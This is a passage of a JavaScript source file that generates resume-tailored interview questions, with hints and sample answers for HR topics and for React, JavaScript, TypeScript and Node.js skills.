// Interview question bank — extracted from App.jsx for performance
export function generateInterviewQuestions(resume) {
  const p    = resume.personal      || {};
  const role = p.title              || '';
  const skills = resume.skills      || [];
  const exp    = resume.experience  || [];
  const proj   = resume.projects    || [];
  const edu    = resume.education   || [];
  const certs  = resume.certifications || [];
  const hasExp = exp.length > 0;
  const e0  = exp[0]  || {};
  const e1  = exp[1]  || {};
  const ed0 = edu[0]  || {};
  const isFresher = !hasExp;
  const rl  = role.toLowerCase();
  const topSkill = skills[0] || 'your primary skill';
  const skillList = skills.slice(0, 4).join(', ') || 'your core skills';
  const company0 = e0.company || 'your previous company';
  const company1 = e1.company || '';
  const degree   = ed0.degree || 'your degree';
  const school   = ed0.school || 'your university';

  // ---------------------------------------------------------------------
  // HR & PERSONAL  (12 questions)
  // ---------------------------------------------------------------------
  const hr = [
    {
      q: `Walk me through your resume - tell me about yourself as a ${role || 'professional'}.`,
      hint: `Structure as: Current/most recent role -> key skills (${topSkill}) -> what you're looking for next. Keep it 90 seconds max.`,
      answer: `I am a ${role || 'dedicated professional'} with a strong background in ${skillList}. ${hasExp ? `Most recently at ${company0}, I contributed to meaningful projects and deepened my expertise in ${topSkill}. ${company1 ? `Before that, I built solid foundations at ${company1}.` : ''}` : `I recently completed my ${degree} at ${school}, developing strong practical skills in ${skillList} through hands-on projects and coursework.`} I bring a combination of technical depth and a strong ownership mentality to everything I work on. I am now looking for an opportunity where I can apply this experience at scale, contribute from day one, and continue growing as a ${role || 'professional'}.`,
    },
    {
      q: `Why are you specifically interested in this role, and why our company?`,
      hint: 'Do your research. Mention one thing specific to the company - product, culture, mission - and tie it to your career direction.',
      answer: `This role aligns directly with my background in ${topSkill} and the type of challenges I am ready to take on next. I am looking for an environment where strong work is recognised, the problems being solved genuinely matter, and I can grow alongside a capable, driven team. Based on what I know about this opportunity, I believe I can add real value quickly while also developing professionally in directions that are important to me.`,
    },
    {
      q: `You have ${skills.length > 0 ? `listed ${topSkill} as a core skill` : 'strong skills on your resume'}. How has that directly contributed to your career so far?`,
      hint: 'Give a concrete example - a project, a result, or a problem you solved using that skill. Numbers make it memorable.',
      answer: `${topSkill} has been a consistent driver of my professional value. ${hasExp ? `At ${company0}, I applied it to tackle complex challenges, deliver on difficult requirements, and produce outcomes the team could be proud of.` : `During my time at ${school}, I built strong practical command of ${topSkill} through rigorous applied projects and independent study.`} It has sharpened how I approach problems - more structurally, with clearer reasoning - and it remains one of the skills I actively invest in because the returns compound directly with career growth.`,
    },
    {
      q: `What is the single biggest professional achievement you are most proud of${hasExp ? ` at ${company0}` : ' from your studies or projects'}?`,
      hint: 'Pick one specific achievement and quantify it. "I reduced X by Y%" is far more powerful than "I improved performance."',
      answer: `I am most proud of ${hasExp ? `a high-impact initiative I drove at ${company0}, where I took full end-to-end ownership - from scoping and planning through to delivery - and aligned multiple stakeholders to make it succeed. The outcome exceeded our original targets and had a measurable positive impact on the team and our users.` : `a project I built during my time at ${school}, where I took complete ownership of the problem, the solution, and the execution. I challenged myself in ways coursework alone could not, and delivered something I am genuinely proud of.`} What I value most is not just the outcome, but the standard I held throughout - clear communication, disciplined execution, and genuine care for the result.`,
    },
    {
      q: `What is your biggest weakness, and what specific steps are you taking to address it?`,
      hint: 'Pick a genuine weakness that is not a core requirement of this role. Then show concrete, ongoing effort to improve - not "I work too hard."',
      answer: `One area I have worked hard to improve is delegation. Early on, I tended to hold tasks too closely because I wanted to ensure quality - which created bottlenecks and limited the team's overall output. I have since built stronger habits around clear task scoping, setting expectations upfront, and trusting colleagues with real ownership rather than over-monitoring. The improvement has been genuine - both my own output and the team's velocity have increased. It remains an area I continue to refine, but the progress has been measurable.`,
    },
    {
      q: `Where do you want to be in your career 3-5 years from now?`,
      hint: `Show progression and ambition within ${role ? 'the ' + role + ' space' : 'this field'}. Align your answer with what this role enables - don't mention roles far outside the company's structure.`,
      answer: `In the next three to five years, I want to grow into a role where I lead meaningful initiatives and contribute at a higher strategic level - whether that is technical leadership, product direction, or cross-functional ownership. I want to deepen my expertise in ${topSkill} while also developing a stronger understanding of the business context around the work. More than any specific title, I am focused on becoming someone who consistently raises the bar - for myself and for the people around me.`,
    },
    {
      q: isFresher
        ? `You are a fresher - what specific skills, projects, or traits make you confident you can contribute from day one?`
        : `Why are you looking to move on from ${company0}?`,
      hint: isFresher
        ? `Reference your academic projects, ${skills.slice(0,2).join(' and ')} skills, and any internship or freelance work. Show hunger, not just qualifications.`
        : 'Keep it growth-focused and professional. "Seeking new challenges" is fine - complaints about managers or salary are not.',
      answer: isFresher
        ? `I am entering the workforce with serious preparation and genuine drive. I have invested heavily in ${skills.slice(0,2).join(' and ')} through my time at ${school} and through independent projects that pushed me beyond the curriculum. I learn fast, I ask the right questions, and I am highly motivated to prove myself in a professional environment. What I may lack in years of experience, I make up for in hunger, adaptability, and the commitment to contribute meaningfully from day one.`
        : `I have reached a natural point where the challenges available to me at ${company0} no longer push me in the directions I want to grow. I have deep respect for the team and everything I built and learned there - and I am proud of my contributions. I am simply ready for larger problems, a stronger environment, and work that stretches me in new ways. This role represents exactly that kind of next step.`,
    },
    {
      q: `How do you respond to constructive criticism from a manager or peer?`,
      hint: 'Show you actively seek feedback, not just accept it. Give a real example of feedback you received, how you applied it, and what improved.',
      answer: `I actively welcome constructive feedback because it is one of the fastest paths to meaningful improvement. When I receive criticism, I make a deliberate effort to listen fully without defensiveness - I want to understand exactly what the person is observing, not defend what I already believe. Once I understand the substance, I reflect on it, and where it is valid, I act quickly and close the loop. I can point to several pieces of feedback that fundamentally shifted how I approach my work - and I am genuinely grateful for those conversations.`,
    },
    {
      q: `Describe how you manage your workload when you have competing priorities or multiple deadlines at once.`,
      hint: 'Mention a real framework: daily task lists, time-blocking, communicating early when at capacity. Give a specific example if you can.',
      answer: `My approach is to first establish clarity rather than treating everything as equally urgent. I surface the competing priorities explicitly, present the trade-offs to the relevant stakeholders, and align on a sequence that reflects actual business impact. Within that plan, I use time-blocking to stay focused and I communicate proactively when something is at risk of slipping - early, not at the last minute. I have found that most priority conflicts are clarity problems in disguise: once everyone has the same information, the right sequence usually becomes straightforward.`,
    },
    {
      q: `How do you keep yourself up to date with the latest trends and changes in ${role ? 'the ' + role + ' field' : 'your industry'}?`,
      hint: `Name specific sources - blogs, courses, communities, GitHub, YouTube channels relevant to ${topSkill}. Vague answers like "I Google things" will not impress.`,
      answer: `I stay current through a consistent set of resources in the ${topSkill} space - technical blogs, newsletters, and active community discussions. Importantly, I complement reading with building: when something significant shifts in the industry, I often build a small proof of concept to understand the implications directly rather than just theoretically. I also discuss what I am learning with peers regularly, because explaining something clearly is the best way to surface where my understanding actually has gaps. This approach has kept me genuinely current and given me informed perspectives in conversations where others are still catching up.`,
    },
    {
      q: isFresher
        ? `How has your ${degree} at ${school} prepared you for a professional career in this field?`
        : `What is one skill or area you deliberately developed outside of your core job responsibilities${hasExp ? ` while at ${company0}` : ''}?`,
      hint: isFresher
        ? 'Tie specific coursework, projects, or skills from your degree directly to the job requirements. Show you have bridged academia and industry.'
        : 'Shows initiative and a growth mindset. This could be a certification, a side project, learning a new tool, or mentoring someone.',
      answer: isFresher
        ? `My ${degree} from ${school} gave me a strong theoretical and practical foundation in ${skillList}. Beyond the formal curriculum, I deliberately sought challenges that would stretch me - independent projects, open-source contributions, and self-directed study in areas I knew would matter professionally. I came out of my degree with real hands-on experience, a genuine ability to learn continuously, and the capacity to operate in ambiguous, real-world environments.`
        : `${hasExp ? `While at ${company0}, I invested intentionally in developing ${topSkill} beyond what my core role demanded.` : 'I have consistently invested in deliberate skill development beyond my formal responsibilities.'} I treat professional growth as part of my job, not an afterthought - which means building side projects, taking targeted courses, and applying new learning to real problems as quickly as possible. The skills that have had the greatest impact on my career trajectory were all built through exactly this kind of consistent, intentional investment.`,
    },
    {
      q: `What does your ideal work environment and team culture look like?`,
      hint: 'Be honest but frame it positively. Mention collaboration style, feedback culture, or autonomy preferences. Avoid negatives like "I hate micromanagement."',
      answer: `I thrive in environments where high standards are a cultural norm - where people take genuine ownership, communicate directly, and hold each other to a high bar with mutual respect. I do my best work when I have clear outcomes to work towards, real trust to execute, and colleagues who are genuinely excellent at what they do. I value both deep independent focus and strong collaboration, and the best teams I have been part of were able to flex between the two based on what the work actually demanded.`,
    },
  ];

  // ---------------------------------------------------------------------
  // TECHNICAL - skill-mapped, deduped, 20+ questions
  // ---------------------------------------------------------------------
  const SKILL_QS = {
    react: [
      { q:'Explain the Virtual DOM in React. How does the reconciliation algorithm decide what to re-render?', hint:'Diffing O(n) algorithm, key props for list optimisation, shouldComponentUpdate vs React.memo.', answer:'The Virtual DOM is a lightweight in-memory representation of the actual DOM. When state or props change, React builds a new Virtual DOM tree, runs its diffing algorithm at O(n) complexity, and applies only the minimum set of changes to the real DOM through reconciliation. For lists, I always use stable, unique key props so React can efficiently track additions, removals, and reorders. I use React.memo on expensive child components to skip re-renders when their props are unchanged, and useMemo and useCallback to stabilise computed values and function references passed down as props.' },
      { q:'What is the difference between useEffect and useLayoutEffect, and when should you use each?', hint:'useEffect: async, after paint. useLayoutEffect: synchronous, before paint - use for DOM measurements to avoid flicker.', answer:'I use useEffect for the vast majority of side effects - data fetching, subscriptions, logging - because it runs asynchronously after the browser has painted, keeping the UI responsive. useLayoutEffect is the right tool when I need to measure DOM dimensions and apply changes in the same frame to prevent visual flicker - for example, positioning a tooltip precisely relative to its anchor element. In practice, I default to useEffect and switch to useLayoutEffect only when I have a specific, demonstrated need for synchronous DOM access.' },
      { q:'How do you prevent unnecessary re-renders in a large React application?', hint:'React.memo, useMemo, useCallback, code splitting with React.lazy, proper component composition.', answer:'My approach starts with component composition - keeping state as local as possible so a change only re-renders the smallest relevant subtree. I use React.memo on stable-prop components, useMemo for expensive computed values, and useCallback to stabilise function references. For global state, I prefer Zustand or React Query over Context for frequently-changing data, since Context re-renders every consumer on every update. I also use React.lazy and Suspense for code splitting, and the React DevTools Profiler to validate that my optimisations are producing real gains - not just theoretical ones.' },
      { q:'Explain React Context API. When would you use it over a state management library like Redux?', hint:'Context: simple shared state (theme, auth). Redux/Zustand: complex state with many actions, time-travel debugging.', answer:'React Context is ideal for low-frequency, application-wide state - things like the authenticated user, current theme, or language setting - data that rarely changes but many components need. When I have complex state with many discrete actions, derived computations, or frequent updates like form inputs, I reach for Zustand or Redux Toolkit, which are purpose-built for this and avoid the performance pitfall of Context re-rendering all consumers on every state change. The most common mistake I see is over-using Context for state that is really just local to a single feature, leading to unnecessary tree-wide re-renders.' },
      { q:'What are React hooks rules and why do they exist?', hint:'Only call at top level, only call from React functions. Rules exist because hooks rely on call order being consistent across renders.', answer:'The two rules exist because React tracks hook state by call order, not by name. If a hook is called conditionally or inside a loop, the call order can differ between renders, corrupting React\'s internal state array for that component and producing unpredictable bugs. Rule one - only call at the top level - ensures the order is always identical. Rule two - only call from React function components or custom hooks - ensures hooks have access to the rendering context. I enforce both rules with eslint-plugin-react-hooks on every project, which catches violations at development time before they reach production.' },
      { q:'How do React error boundaries work and when should you implement them?', hint:'Class component with componentDidCatch + getDerivedStateFromError. Renders fallback on subtree error. Use around major sections to prevent full-page crashes.', answer:'Error boundaries are class components that implement getDerivedStateFromError to update state and componentDidCatch to log the error. When a rendering error occurs anywhere in the wrapped component subtree, the boundary catches it and renders a fallback UI instead of letting the crash propagate and blank the entire page. I implement boundaries at major structural sections: the main content area, individual widgets or data-driven panels, and any component that fetches external data. Without boundaries, a single render error crashes the entire React tree - the whole page goes blank. With them, only the affected section fails while the rest of the application continues. For functional components I use a reusable ErrorBoundary class, or the react-error-boundary library which provides a clean onReset hook.' },
      { q:'Explain the difference between useMemo and useCallback. How do you avoid over-optimisation?', hint:'useMemo: memoises a computed value. useCallback: memoises a function reference. Both need a dependency array. Overuse adds complexity with marginal gain.', answer:'useMemo caches a computed value and recomputes it only when its dependencies change - useful for expensive calculations or building derived state. useCallback caches a function reference, returning the same function object across renders unless dependencies change - useful for stabilising handlers passed to child components or useEffect dependency arrays. Both come at a cost: comparing dependency arrays on every render and adding code complexity. The over-optimisation trap is applying them everywhere. My rule is profile first: if React DevTools shows unnecessary re-renders, investigate the cause before reaching for memo. The highest-value use of useCallback is when a function is a dependency of useEffect - without it, the effect runs on every render. The highest-value use of useMemo is genuinely expensive computations (sorting large datasets, complex transformations) that are triggered by frequently changing state.' },
      { q:'How does code splitting with React.lazy and Suspense reduce initial bundle size?', hint:'Dynamic import() splits the bundle at that boundary. React.lazy wraps the import. Suspense shows a fallback while loading. Route-level splitting has the biggest impact.', answer:'React.lazy accepts a function that calls a dynamic import: const LazyPage = React.lazy(() => import("./Page")). Webpack and Vite treat each dynamic import as a split point, placing that module and its dependencies in a separate chunk that is not included in the initial bundle. When the component is first rendered, React loads the chunk asynchronously and Suspense shows the fallback (a spinner, skeleton, or null) during loading. Route-level splitting is the most impactful pattern - each page component is lazily loaded so users only download code for pages they visit. Component-level splitting makes sense for heavy components like chart libraries or rich text editors that are not immediately visible on load. Without splitting, every page ships with code for every other page, inflating the initial bundle and delaying time-to-interactive for users who may never visit those pages.' },
      { q:'What is your approach to testing React components? What and how do you test?', hint:'React Testing Library: test behaviour not implementation. getByRole/getByText over className. Mock only at boundaries (msw). Integration-style over isolated unit.', answer:'My philosophy is: test what users see and do, not implementation details. React Testing Library encourages this - queries like getByRole, getByText, and getByLabelText reflect how users perceive the UI, not how it is structured internally. Tests survive refactors that preserve behaviour but change implementation, which is the goal. I avoid testing internal state directly, avoid enzyme-style shallow rendering, and mock only at true system boundaries - network requests with msw, browser APIs that do not exist in jsdom. For coverage prioritisation, I focus on critical user flows with integration-style tests that render a component tree together: a login form test renders the whole form, fires user interactions via fireEvent or userEvent, and asserts on visible outcomes like success messages or redirects. These tests catch real integration bugs and give more confidence per test written than isolated unit tests that mock everything.' },
      { q:'When should you extract a custom hook? Give an example of a well-designed one.', hint:'Extract when: stateful logic reused across components, complex state benefits from separation, encapsulating an external system access (localStorage, WebSocket, SDK).', answer:'I extract a custom hook when the same stateful logic appears in more than one component, when a component has complex internal logic that benefits from being named and tested separately, or when I need to encapsulate access to an external system behind a clean interface. A real example: I extracted a useIntersectionObserver(ref) hook that returns a boolean for whether an element is visible in the viewport - used across three components for lazy loading images and triggering analytics events. The hook version was a third of the code with better cleanup than the copy-pasted version in each component. What custom hooks should avoid: hiding important data flow to the point where usage is not obvious from the name. A hook named useData that does network fetching, transforms results, and manages auth is too broad - the abstraction hurts clarity more than it helps.' },
    ],
    javascript: [
      { q:'Explain closures in JavaScript with a real-world use case from your work.', hint:'Functions retaining lexical scope. Real use cases: factory functions, private variables, memoisation, event handlers.', answer:'A closure is a function that retains access to its outer lexical scope even after the outer function has finished executing. In practical terms, the inner function can read and modify variables from the enclosing scope long after it has closed. I use closures regularly - for factory functions with truly private internal state, for debounce and throttle utilities that hold a timer reference, for memoisation where the cache lives in the closure, and for module patterns that expose a controlled public API while hiding internals. A common gotcha is the var-in-loop problem, where all iterations share the same variable binding - let fixes this cleanly by creating a new binding per iteration.' },
      { q:'What is the event loop and how does JavaScript handle asynchronous code?', hint:'Call stack, Web APIs, callback queue, microtask queue. Promises (microtasks) run before setTimeout (macro-tasks).', answer:'JavaScript is single-threaded, so asynchronous operations are coordinated by the event loop. When async work completes - a fetch, a timer - the callback is placed in a queue. The event loop continuously checks whether the call stack is empty, and when it is, it pulls the next task from the queue. The critical distinction is between the microtask queue - Promises and queueMicrotask - which is always drained completely before the event loop moves to the next macrotask from the setTimeout/setInterval queue. This means a chain of resolved Promises runs to completion before any setTimeout fires, which is why async/await behaves predictably even in deeply nested scenarios.' },
      { q:'What is the difference between == and === in JavaScript? When would you deliberately use ==?', hint:'=== strict equality (no coercion). == loose equality. Rarely use == intentionally - maybe null == undefined checks.', answer:'I use strict equality (===) as the default throughout all my code because it compares both value and type with no coercion - there are no surprises. Loose equality (==) performs type coercion before comparison, producing well-known but unintuitive results: 0 == \'\' is true, null == undefined is true, [] == false is true. The only situation where I deliberately use == is the null check: x == null, which neatly catches both null and undefined in one expression. In team codebases I still prefer the explicit form for clarity, and I use the eqeqeq ESLint rule to enforce === project-wide.' },
      { q:'Explain prototypal inheritance in JavaScript versus classical inheritance.', hint:'JS objects link to prototype objects via [[Prototype]]. ES6 classes are syntactic sugar over the same prototype chain.', answer:'In JavaScript, every object has a hidden [[Prototype]] link to another object, and property lookups walk up this chain until they find the property or reach null - this is prototypal inheritance. Objects delegate to their prototypes rather than copying from a class blueprint. ES6 class syntax is syntactic sugar over this: extends sets up the prototype chain and super calls the parent constructor, but no actual class blueprints are created. This matters practically because methods are shared across all instances via the prototype, mutating prototype properties affects all instances simultaneously, and the behaviour differs fundamentally from languages like Java where classes are definitions copied into instances.' },
      { q:'What are the differences between var, let, and const? What are the scoping rules for each?', hint:'var: function-scoped, hoisted. let/const: block-scoped, temporal dead zone. const: binding immutable, not value.', answer:'I avoid var entirely in modern code. Its function-scoped nature and hoisting behaviour produce subtle bugs - especially in loops and async callbacks where closure over a var binding captures the final value rather than the value at iteration time. let is block-scoped and respects the temporal dead zone - it exists within the block but cannot be accessed before its declaration, preventing accidental hoisting reliance. const creates an immutable binding - not an immutable value - so a const array can still be mutated with push. My default is const for everything, dropping to let only when I have a genuine need for reassignment. This makes intent immediately clear to anyone reading the code.' },
      { q:'How do Promises work, and how does async/await improve on the .then() chain syntax?', hint:'Promise: wrapper for eventual value (pending/fulfilled/rejected). Async/await: syntactic sugar over Promises. try/catch for errors. Promise.all for concurrent calls.', answer:'A Promise wraps an eventual value - it starts pending and transitions to either fulfilled with a value or rejected with an error. The .then()/.catch() chain syntax works but nests poorly for sequential async operations. async/await is syntactic sugar: an async function always returns a Promise, and await suspends the function until the awaited Promise resolves. The result is sequential-looking async code that is far easier to read and debug than nested .then() chains, with error handling through familiar try/catch blocks. The most important performance consideration: await is sequential by default. Writing const a = await getA(); const b = await getB() runs them serially and takes the sum of both durations. When operations are independent, I use Promise.all: const [a, b] = await Promise.all([getA(), getB()]), which runs both concurrently.' },
      { q:'What is event delegation in JavaScript and why is it important for performance?', hint:'Attach one listener to a parent rather than many listeners to children. Events bubble up the DOM. Handles dynamically added elements without re-attaching listeners.', answer:'Event delegation adds a single listener to a parent element rather than individual listeners to each child. This works because DOM events bubble up the tree - a click on a child element triggers click handlers on every ancestor. The parent listener handles all clicks by checking event.target or event.target.closest() to identify which child was clicked and respond accordingly. This is more memory-efficient for large lists - one listener versus hundreds - simpler to manage lifecycle-wise, and critical for dynamically added elements: a child appended after the listener was set up is automatically handled because it still bubbles to the same parent. It is fundamental to how frameworks like React implement their synthetic event system internally. I also use it when building custom dropdown menus or interactive tables where many individual elements need the same interaction handling.' },
      { q:'Explain debounce versus throttle. Give a real use case for each.', hint:'Debounce: delay until quiet period ends (search input). Throttle: limit to one call per interval (scroll/resize handler). Both prevent performance problems from high-frequency events.', answer:'Debounce delays execution until after a quiet period - if the function is called again before the delay expires, the timer resets. Use case: search-as-you-type. I want to fire the API call after the user stops typing for 300ms, not on every keystroke. Without debounce, fast typing triggers dozens of concurrent requests, wasting bandwidth and producing race conditions. Throttle limits how frequently a function can fire - it executes at most once per specified interval regardless of call frequency. Use case: scroll or resize event handlers. These fire many times per second; a throttled handler at 100ms intervals reduces execution from potentially 100 calls per second to 10, preventing layout thrashing and performance degradation. Both are essential tools for event-driven code. Libraries like Lodash provide battle-tested implementations; I prefer using those over hand-rolling to avoid edge cases in the cancel and flush logic.' },
      { q:'What is the difference between a deep copy and a shallow copy? How do you implement each?', hint:'Shallow: copies references (spread, Object.assign). Deep: recursively copies all levels (structuredClone, JSON parse/stringify, Lodash cloneDeep). Mutations propagate through shallow copies.', answer:'A shallow copy duplicates the top-level structure but keeps references to nested objects - modifying a nested object through the copy also modifies the original. The spread operator ({...obj}) and Object.assign({}, obj) both produce shallow copies. A deep copy recursively duplicates all nested structures so the copy is fully independent. JSON.parse(JSON.stringify(obj)) is the simplest deep copy for plain data but loses undefined values, functions, Date objects (converted to strings), and circular references. structuredClone() is the modern native API - available in all current browsers and Node 17+ - handles more types correctly including Date, Map, Set, and ArrayBuffer. Lodash _.cloneDeep handles circular references and is the safe choice for complex objects. I always clarify which is needed before writing the code - shallow copies of nested configuration objects cause subtle bugs when mutations propagate unexpectedly.' },
      { q:'What are JavaScript design patterns and when do you apply them?', hint:'Module (encapsulation), Observer (loose coupling), Factory (object creation), Singleton (shared instance), Strategy (swappable algorithm). Applied based on the specific design problem.', answer:'I use patterns contextually, not formulaically. The Module pattern encapsulates related state and behaviour behind a controlled API - the natural form of ES modules. The Observer/EventEmitter pattern decouples producers from consumers through subscriptions - I use this for custom event systems and reactive state updates where the publisher should not know about its listeners. The Factory pattern creates objects through a function rather than new, allowing the creation logic to vary without changing the caller - useful for creating different types of a service based on configuration. The Singleton pattern ensures only one instance exists - appropriate for configuration objects and connection pools, but I use it carefully since it introduces global state that is hard to test. The Strategy pattern swaps interchangeable algorithms at runtime - I used this for a file upload module where the storage provider (S3, Azure, GCS) varied by environment while the calling code remained identical.' },
    ],
    typescript: [
      { q:'What is the difference between interface and type in TypeScript? When would you choose one over the other?', hint:'interface: extendable, better for OOP patterns. type: unions, intersections, computed types. Both work for object shapes.', answer:`Both interface and type can describe object shapes, but their superpowers are different. I prefer interface for public API shapes because it supports declaration merging - if a library and my code both declare an interface with the same name, TypeScript merges them - and extends syntax reads naturally for OOP hierarchies. I reach for type when I need unions, intersections, conditional types, template literal types, or mapped types - things interfaces simply cannot express. For example, a union type like type Result<T> = { ok: true; data: T } | { ok: false; error: string } has no interface equivalent. My default is interface for object shapes that others will extend, and type for everything compositional.` },
      { q:'Explain TypeScript generics with a practical example you have used.', hint:'Type parameters that let you write reusable, type-safe functions. E.g. function identity<T>(arg: T): T {}', answer:`Generics let me write functions and types that work with many different types while preserving type information throughout. The simplest example is a typed first helper: function first<T>(arr: T[]): T | undefined - this works for any array and the return type narrows correctly based on what you pass in. I use generics heavily for API response wrappers: type ApiResponse<T> = { data: T; error: null } | { data: null; error: string } - callers get full type safety on the data field without needing a separate type per endpoint. Another real example is a custom hook: function useLocalStorage<T>(key: string, initialValue: T): [T, (value: T) => void] - the generic flows from the initial value and TypeScript infers everything correctly downstream without any explicit annotation from the caller.` },
      { q:'What are TypeScript utility types and name five you use regularly?', hint:'Partial, Required, Readonly, Pick, Omit, Record, Exclude, Extract, ReturnType, Parameters.', answer:`Utility types are built-in generic types that transform existing types rather than defining new ones from scratch. I use Partial<T> constantly for update payloads - it makes every property optional so you can pass only the fields being changed. Omit<T, K> lets me exclude sensitive fields like password before serialising a User type to a response. Pick<T, K> does the opposite - selecting only the fields a component needs from a large type. Record<K, V> is my go-to for typed key-value maps, like Record<UserId, User>. ReturnType<typeof fn> is invaluable when a function's return value is complex - rather than manually defining the type, I derive it directly from the function, so they stay in sync automatically. These five cover the majority of real-world type manipulation I encounter.` },
      { q:'How does TypeScript handle null and undefined, and how do you work with strict null checks?', hint:'strictNullChecks: null/undefined are not assignable to other types. Use optional chaining (?.), nullish coalescing (??).',answer:`With strictNullChecks enabled - which I always require in tsconfig - null and undefined are their own distinct types rather than assignable to everything. This means accessing a property on a potentially null value is a compile error, forcing you to handle the null case explicitly. Optional chaining (?.) lets me safely navigate deep property chains: user?.profile?.avatar returns undefined if any link in the chain is nullish, without throwing. Nullish coalescing (??) provides a fallback only when the value is specifically null or undefined, unlike the OR operator which triggers on any falsy value - so 0 ?? 'default' correctly returns 0, not 'default'. For non-null assertion (!) I use it sparingly and only when I have knowledge the compiler does not - overuse is a code smell indicating the types are wrong.` },
      { q:'What are TypeScript conditional types and mapped types? Give a real use case for each.', hint:'Conditional: T extends U ? X : Y. Mapped: iterates over keys to transform a type. Both are meta-programming at the type level.', answer:`Conditional types express type logic using the extends keyword: type IsArray<T> = T extends any[] ? true : false. The infer keyword extracts parts of a type within the conditional: type UnpackArray<T> = T extends Array<infer Item> ? Item : T gives you the element type of an array. Mapped types iterate over the keys of an existing type and transform them: type Nullable<T> = { [K in keyof T]: T[K] | null } makes every property nullable. The built-in utility types are implemented with these - Partial<T> is { [K in keyof T]?: T[K] }, Readonly<T> is { readonly [K in keyof T]: T[K] }. A real use case: I used a mapped type to create a validated form state type that mirrored a data model but replaced every value type with { value: T; error: string | null }. These features make TypeScript's type system Turing-complete and are where deep type safety for complex frameworks is implemented.` },
      { q:'Explain type narrowing in TypeScript. What are the different narrowing techniques?', hint:'typeof, instanceof, in operator, discriminated unions, type predicates (is), truthiness checks. Narrowing lets TS refine a broad type to a specific one inside a branch.', answer:`Type narrowing allows TypeScript to refine a broad type to a more specific one within a code branch based on runtime checks. typeof narrows primitive types: if (typeof x === 'string') - TypeScript knows x is string inside that block. instanceof narrows class instances. The in operator narrows object shapes: if ('name' in obj) - TypeScript knows obj has a name property. Discriminated unions are my favourite pattern: a union of object types each with a literal discriminant field (type: 'success' | 'error') allows exhaustive narrowing with switch statements, and TypeScript flags unhandled cases. Type predicates let you write custom narrowing functions: function isUser(x: unknown): x is User { return typeof x === 'object' && x !== null && 'id' in x }. Narrowing is how you safely work with unknown (the type-safe alternative to any), API responses, and library return types that are broader than you know they will be in practice.` },
      { q:'What are discriminated unions in TypeScript and why are they powerful?', hint:'Union of types each with a literal "tag" field. Exhaustive switch checks. Compiler catches missing cases. Models state machines and API response shapes cleanly.', answer:`A discriminated union is a union of types that share a common literal property - the discriminant - allowing TypeScript to narrow the type precisely based on that field's value. A classic example is an API result type: type Result<T> = { status: "success"; data: T } | { status: "error"; message: string } | { status: "loading" }. When you switch on status, TypeScript knows exactly which shape you have in each branch - accessing .data in the "error" branch is a type error. This is especially powerful for modelling state machines: every state is represented as a distinct type, transitions between states are type-checked, and adding a new state variant causes every switch statement to flag an unhandled case (with the never type in the default branch as an exhaustiveness check). I use discriminated unions for API response modelling, command/event patterns, and any domain that has clearly distinct states with different data shapes.` },
      { q:'How do you use TypeScript with REST APIs - how do you type request and response objects?', hint:'Define response types as interfaces/types. Use generics for reusable fetch wrappers. Zod or io-ts for runtime validation of external API data. Do not trust type assertions on API responses.', answer:`The most common mistake is typing external API responses with type assertions (response as UserType) - this silently accepts wrong data and moves runtime errors into mysterious behaviour. My approach: define the expected shape as a TypeScript interface or type, but validate the actual API response at runtime before casting. I use Zod schemas that both define the shape and validate data, so a schema parse() throws a clear error if the API returns unexpected data instead of letting bad data propagate silently. For reusable fetch utilities, a generic wrapper handles the common patterns: async function fetchJson<T>(url: string, schema: ZodSchema<T>): Promise<T>. For internal APIs where I control both ends, I use tools like tRPC that generate TypeScript types from the server implementation, giving end-to-end type safety without manual schema duplication. For third-party APIs I look for community-maintained type packages (@types/stripe, for example) and supplement with Zod validation for the fields I actually use.` },
      { q:'What is declaration merging in TypeScript and when is it useful?', hint:'Multiple declarations with the same name are merged into one. Useful for augmenting third-party module types (Express req, process.env), and extending interfaces incrementally.', answer:`Declaration merging means TypeScript automatically merges multiple declarations with the same name into a single combined declaration. Interface merging is the most common form: two interface declarations with the same name are automatically combined, which is why you can extend third-party interfaces by re-declaring them. A classic use case: augmenting Express Request to include a user property added by auth middleware - declare global { namespace Express { interface Request { user?: AuthUser } } }. Now req.user is typed everywhere without changing the library. The same technique augments process.env to make environment variables typed. Namespace merging allows extending namespaces from external libraries with additional exports. Function and class declaration merging with a namespace adds static properties. I use declaration merging sparingly and deliberately - it is a powerful escape hatch for typing third-party code that does not expose the types you need, not a general-purpose extension mechanism.` },
    ],
    'node.js': [
      { q:'Explain the Node.js event loop in detail - what are its phases?', hint:'Timers -> Pending I/O -> Idle/Prepare -> Poll -> Check (setImmediate) -> Close callbacks. process.nextTick runs between phases.', answer:`The Node.js event loop processes work in six ordered phases per iteration. Timers executes callbacks scheduled by setTimeout and setInterval whose delay has elapsed. Pending I/O handles callbacks from the previous iteration's I/O operations that were deferred. Idle and Prepare are internal phases. Poll is the heart of the loop - it retrieves new I/O events and executes their callbacks, or blocks waiting for I/O when there is nothing else to do. Check runs setImmediate callbacks. Close callbacks handle socket or handle close events. Crucially, process.nextTick and Promise microtasks are not part of these phases - they run in a microtask queue that is drained completely between every phase transition, giving them the highest priority. Misunderstanding this is a common source of bugs in code that mixes nextTick with I/O callbacks.` },
      { q:'What is the difference between process.nextTick and setImmediate?', hint:'nextTick: before next event loop iteration (highest priority). setImmediate: in Check phase. nextTick can starve I/O if overused.', answer:`process.nextTick schedules a callback to run before the event loop moves to the next phase - it drains the entire nextTick queue before any I/O or timer callbacks run. setImmediate schedules a callback to run in the Check phase of the current event loop iteration, after any I/O callbacks in the Poll phase. In practice, process.nextTick is useful for deferring work that must happen after the current synchronous stack completes but before any I/O - for example, emitting an error event from a constructor so callers have time to attach listeners. However, recursive use of nextTick can starve the I/O phase entirely, blocking all async operations. setImmediate is safer for deferring non-critical work because it plays nicely with I/O in the event loop cycle.` },
      { q:'How do you handle errors in async Express routes to prevent unhandled promise rejections?', hint:'Wrap async handlers in try/catch and pass to next(err), or use a wrapper like express-async-errors.', answer:`Express was designed before async/await, so by default it does not catch rejected promises from async route handlers - they become unhandled rejections that crash the process in recent Node versions. The standard fix is to wrap each async handler in a try/catch and call next(err) in the catch block, which routes the error to Express's error-handling middleware. Since this is repetitive, I prefer a small utility wrapper: const asyncHandler = fn => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next). Alternatively, the express-async-errors package monkey-patches Express to handle this automatically. I also register a centralized error-handling middleware as the last middleware - (err, req, res, next) - which formats and logs all errors consistently without duplicating error handling in every route.` },
